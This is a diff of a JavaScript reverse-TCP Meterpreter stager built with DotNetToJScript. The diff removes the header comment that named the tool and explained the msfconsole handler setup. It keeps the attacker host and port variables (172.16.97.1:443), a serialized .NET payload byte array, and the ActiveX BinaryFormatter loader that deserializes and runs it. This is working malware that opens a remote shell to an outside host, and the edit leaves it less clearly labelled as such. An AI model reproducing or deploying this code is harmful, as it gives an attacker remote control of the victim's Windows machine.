@@ -1,39 +1,5 @@
-/*
-     ____. _________   _____          __                
-    |    |/   _____/  /     \   _____/  |_  ___________ 
-    |    |\_____  \  /  \ /  \_/ __ \   __\/ __ \_  __ \
-/\__|    |/        \/    Y    \  ___/|  | \  ___/|  | \/
-\________/_______  /\____|__  /\___  >__|  \___  >__|   
-                 \/         \/     \/          \/       
-
-JavaScript Reversed TCP Meterpreter Stager - by Cn33liz 2017
-CSharp Meterpreter Stager build by Cn33liz and embedded within JavaScript using DotNetToJScript from James Forshaw
-https://github.com/tyranid/DotNetToJScript
-
-This Stager should run on x86 as well as x64
-
-Usage:
-Change RHOST and RPORT to suit your needs:
-*/
-
-var RHOST = "172.16.97.1";
-var RPORT = "443";
-
-/*
-Start Msfconsole:
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of cscript.exe
-set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of cscript.exe
-set LHOST 0.0.0.0
-set LPORT 443
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
-set ExitOnSession false
-exploit -j 
-
-Then run: cscript.exe JSMeter.js on Target
-*/
-
+var RHOST = '172.16.97.1';
+var RPORT = '443';
 var serialized_obj = [
 0,1,0,0,0,255,255,255,255,1,0,0,0,0,0,0,0,4,1,0,0,0,34,83,121,115,116,101,109,46,68,101,108,
 101,103,97,116,101,83,101,114,105,97,108,105,122,97,116,105,111,110,72,111,108,100,101,114,3,0,0,0,8,68,101,108,
@@ -302,16 +268,13 @@ var serialized_obj = [
 111,97,100,40,66,121,116,101,91,93,41,8,0,0,0,10,11
 ];
 var entry_class = 'MeterPreter';
-
 try {
     var stm = new ActiveXObject('System.IO.MemoryStream');
     var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
     var al = new ActiveXObject('System.Collections.ArrayList')
-
     for (i in serialized_obj) {
         stm.WriteByte(serialized_obj[i]);
     }
-
     stm.Position = 0;
     var n = fmt.SurrogateSelector;
     var d = fmt.Deserialize_2(stm);
